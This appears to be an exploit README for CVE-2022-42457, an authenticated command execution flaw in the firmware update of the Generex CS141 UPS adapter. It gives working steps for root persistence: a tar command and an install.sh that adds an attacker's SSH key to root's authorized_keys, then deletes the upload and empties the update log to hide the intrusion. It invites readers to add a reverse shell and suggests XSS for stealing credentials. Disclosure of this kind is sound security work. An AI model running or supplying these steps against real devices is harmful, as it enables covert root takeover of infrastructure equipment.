# CVE-2022-42457 Generex-CS141-Authenticated-Remote-Command-Execution

## Description:
The device [CS141](https://www.generex.de/products/ups) is an Ethernet Adapter for the control and the management of UPS Facilities. A list of supported UPS Vendors can be found at the bottom.

The Firmware update process allows to execute arbitrary commands. Most of the time, these type of devices are overlooked and never controlled.
Therefore, it is from value to execute commands directly on the underlying Linux.

## Vulnerable versions
At the time of writing, all versions up to the latest version '2.10' are vulnerable. Therefore, no patch is currently available.

## Exploit
The update script located in `/usr/bin/gxserve-update.sh` simply executes the script `Ã¬nstall.sh` inside a gzip compressed tarball as root.
The responsible function is `run_update()` which extracts the script install.sh from a tarball (line 111) and executes it (line 132,133).

![alt text](gxserve-update.sh.png "update script")

Therefore, to execute commands simply create a tarball with a `version` and `install.sh` file which contains your reverse shell or other commands.

The following command creates the update tarball with the install.sh script which will be executed. Please note, the `./` is important and the version number must be greater than the current version.
```
tar cvzf update211.tar.gz ./install.sh version
```
The `version` file should look like
```
version=2.11
```
The `install.sh` may look like
```
#!/bin/sh
# bch8
# Add your rev shell or simply an ssh pub key here
echo -n 'ecdsa-sha2-nistp384 AAAAE2...' >> /root/.ssh/authorized_keys

# Do some cleanup
rm -f /tmp/version
rm -f /var/www/hiawatha/upload/update*.tar.gz
rm -f /tmp/install.sh
echo -n > /var/log/update.log
sync
```


Further more, the client-side application has been done with the EOL Anuglar project, which contains a well known [Prototype Pollution vulnerability](https://security.snyk.io/vuln/SNYK-JS-ANGULAR-534884).
So a possible way to get credentials would be to prepare some XSS. The Authentication is done by the Hiawatha webserver.
